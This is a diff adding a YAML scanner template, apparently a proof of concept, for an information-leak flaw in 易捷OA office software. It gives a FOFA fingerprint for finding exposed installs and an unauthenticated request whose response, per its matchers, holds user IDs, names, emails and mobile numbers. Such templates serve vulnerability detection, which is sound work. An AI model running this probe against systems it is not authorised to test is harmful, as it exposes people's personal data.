@@ -1,0 +1,19 @@
+id: poc-yaml-yijie-oa-getuserdeptdropdownlist-info-leak
+info:
+  name: 易捷OA协同办公软件 getUserDeptDropDownList 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 易捷OA
+  fofa: body="/images/logon/bg_img.jpg"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"协同办公系统")
+- method: GET
+  path: /autohint.t?op=getUserDeptDropDownList
+  expression: "status_code == 200 &&\ncontains(body,\"{userid:\") && \ncontains(body,\"\
+    username:\") &&\ncontains(body,\"email:\") &&\ncontains(body,\"mobile:\") &&\n\
+    !contains(body,\"<\")\n"
+variables: {}
+transport: http
